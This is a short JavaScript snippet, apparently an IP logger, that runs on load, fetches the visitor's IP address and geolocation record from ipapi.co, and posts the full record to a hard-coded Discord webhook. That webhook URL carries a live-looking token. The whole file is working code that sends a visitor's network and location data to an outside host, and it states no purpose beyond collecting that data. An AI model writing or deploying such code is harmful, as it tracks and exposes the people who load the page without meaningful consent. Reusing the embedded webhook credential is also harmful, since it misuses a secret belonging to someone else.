const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8";

async function sendIPInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();

    alert("Fetched IP info! Sending to Discord...");

    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: "Raw API Response:\n```json\n" + JSON.stringify(data, null, 2) + "\n```"
      })
    });

    alert("Sent successfully!");
  } catch (error) {
    alert("Error: " + error);
  }
}

sendIPInfo();
